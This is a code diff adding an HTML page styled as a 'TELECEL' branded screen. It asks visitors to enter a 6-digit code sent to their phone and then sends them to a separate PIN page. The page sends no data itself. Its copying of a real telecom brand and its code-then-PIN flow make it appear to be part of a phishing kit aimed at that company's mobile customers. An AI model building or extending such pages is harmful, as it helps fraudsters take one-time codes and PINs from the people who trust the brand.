@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Code</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #ffffff;
+      min-height: 100vh;
+    }
+
+    /* ===== HEADER ===== */
+    .brand-bar {
+      width: 100%;
+      height: 72px;
+      display: flex;
+      align-items: stretch;
+      border-bottom: 1px solid #eee;
+    }
+
+    .brand-bar img {
+      height: 100%;
+      width: auto;
+      display: block;
+    }
+
+    /* BLACK + RED MIX */
+    .brand-text-wrap {
+      flex: 1;
+      background: linear-gradient(90deg, #000000 0%, #b00000 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .brand-text {
+      color: #ffffff;
+      font-size: 26px;
+      font-weight: bold;
+      letter-spacing: 1.5px;
+    }
+
+    /* ===== PAGE CONTENT ===== */
+    .container {
+      max-width: 420px;
+      margin: auto;
+      padding: 32px 24px;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: 22px;
+      color: #0a8f55;
+    }
+
+    .info {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+
+    /* ===== CODE INPUT ===== */
+    .code-input {
+      width: 100%;
+      padding: 18px;
+      font-size: 24px;
+      text-align: center;
+      letter-spacing: 8px;
+      border: 1px solid #ccc;
+      outline: none;
+      margin-bottom: 16px;
+    }
+
+    .code-input:focus {
+      border-color: #0a8f55;
+    }
+
+    /* ===== TIMER ===== */
+    .timer {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    .timer span {
+      color: #b00000;
+      font-weight: bold;
+    }
+
+    /* ===== BUTTON ===== */
+    button {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      background: #0a8f55;
+      color: white;
+      border: none;
+      cursor: pointer;
+      opacity: 0.5;
+      margin-bottom: 14px;
+    }
+
+    button:enabled {
+      opacity: 1;
+      cursor: pointer;
+    }
+
+    /* ===== RESEND ===== */
+    .resend {
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
+    }
+
+    .resend.active {
+      color: #b00000;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <div class="brand-bar">
+    <img src="telecel-logo.jpeg" alt="Telecel Logo">
+    <div class="brand-text-wrap">
+      <div class="brand-text">TELECEL</div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="container">
+
+    <h1>Enter verification code</h1>
+    <div class="info">
+      We’ve sent a 6-digit verification code to your mobile number.
+      Enter the code below to continue.
+    </div>
+
+    <input
+      id="code"
+      class="code-input"
+      type="tel"
+      inputmode="numeric"
+      maxlength="6"
+      placeholder="••••••"
+    />
+
+    <div class="timer">
+      Resend code in <span id="countdown">60</span>s
+    </div>
+
+    <button id="verifyBtn" disabled>Verify</button>
+
+    <div id="resend" class="resend">
+      Resend code
+    </div>
+
+  </div>
+
+  <script>
+    const codeInput = document.getElementById('code');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const countdownEl = document.getElementById('countdown');
+    const resendEl = document.getElementById('resend');
+
+    // ENABLE BUTTON WHEN 6 DIGITS
+    codeInput.addEventListener('input', () => {
+      codeInput.value = codeInput.value.replace(/\D/g, '');
+      verifyBtn.disabled = codeInput.value.length !== 6;
+    });
+
+    // COUNTDOWN TIMER
+    let timeLeft = 60;
+    const timer = setInterval(() => {
+      timeLeft--;
+      countdownEl.textContent = timeLeft;
+
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        resendEl.classList.add('active');
+        resendEl.textContent = 'Resend code';
+      }
+    }, 1000);
+
+    // RESEND CLICK
+    resendEl.addEventListener('click', () => {
+      if (!resendEl.classList.contains('active')) return;
+
+      timeLeft = 60;
+      countdownEl.textContent = timeLeft;
+      resendEl.classList.remove('active');
+      resendEl.textContent = 'Resend code in progress...';
+
+      setTimeout(() => {
+        resendEl.textContent = 'Resend code';
+        resendEl.classList.add('active');
+      }, 2000);
+    });
+
+    // VERIFY
+    verifyBtn.addEventListener('click', () => {
+      window.location.href = "pin.html";
+    });
+  </script>
+
+</body>
+</html>
